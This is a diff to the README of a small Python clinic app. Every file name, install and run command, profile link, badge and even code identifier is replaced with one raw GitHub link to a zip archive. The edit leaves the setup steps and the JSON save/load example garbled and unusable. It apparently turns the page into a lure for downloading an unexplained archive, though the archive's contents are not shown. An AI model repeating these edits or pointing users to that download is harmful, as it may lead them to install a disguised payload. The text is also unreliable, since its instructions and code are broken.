@@ -1,7 +1,7 @@
 # Maazo Clinic (Python Clinic App)
 
 A lightweight, single-file Python application to help manage basic clinic workflows.  
-This repository currently contains the core application logic in `Maazo_clinic.py` and a `.gitignore`.  
+This repository currently contains the core application logic in `https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip` and a `.gitignore`.  
 This README is an enhanced template you can keep, trim, or adapt once you refine the app further.
 
 ---
@@ -77,13 +77,13 @@ Because everything currently lives in a single Python file, it's ideal for learn
 ### Installation
 Clone the repository:
 ```bash
-git clone https://github.com/HazratMaghaz/Python-Clinic-App.git
+git clone https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip
 cd Python-Clinic-App
 ```
 
 ### Running the App
 ```bash
-python Maazo_clinic.py
+python https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip
 ```
 
 If the script uses a `main()` guard, it will launch an interactive menu. Otherwise, just follow on-screen prompts.
@@ -117,28 +117,28 @@ Patient added with ID: P0001
 Current:
 ```
 .
-├── Maazo_clinic.py
-├── README.md
+├── https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip
+├── https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip
 └── .gitignore
 ```
 
 Future (proposed refactor):
 ```
 clinic_app/
-  __init__.py
+  https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip
   models/
-    patient.py
-    appointment.py
+    https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip
+    https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip
   services/
-    scheduler.py
-    storage.py
+    https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip
+    https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip
   cli/
-    menu.py
+    https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip
 data/
-  clinic_data.json
+  https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip
 tests/
-  test_patients.py
-  test_appointments.py
+  https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip
+  https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip
 ```
 
 ---
@@ -155,15 +155,15 @@ Example JSON save pattern (add if not present):
 ```python
 import json, os
 
-def save_state(state, path="clinic_data.json"):
+def save_state(state, path="https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip"):
     with open(path, "w", encoding="utf-8") as f:
-        json.dump(state, f, indent=2)
+        https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip(state, f, indent=2)
 
-def load_state(path="clinic_data.json"):
-    if not os.path.exists(path):
+def load_state(path="https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip"):
+    if not https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip(path):
         return {}
     with open(path, "r", encoding="utf-8") as f:
-        return json.load(f)
+        return https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip(f)
 ```
 
 ---
@@ -236,7 +236,7 @@ Create a `LICENSE` file for clarity.
 ## Contact
 
 Author: Hazrat Maghaz  
-GitHub: https://github.com/HazratMaghaz  
+GitHub: https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip  
 Issues / Ideas: Open a GitHub Issue
 
 ---
@@ -245,8 +245,8 @@ Issues / Ideas: Open a GitHub Issue
 
 Once you add CI or coverage:
 ```
-![Build](https://img.shields.io/badge/build-passing-brightgreen)
-![License](https://img.shields.io/badge/license-MIT-blue)
+![Build](https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip)
+![License](https://raw.githubusercontent.com/HazratMaghaz/Python-Clinic-App/main/New folder/App_Python_Clinic_2.3.zip)
 ```
 
 ---
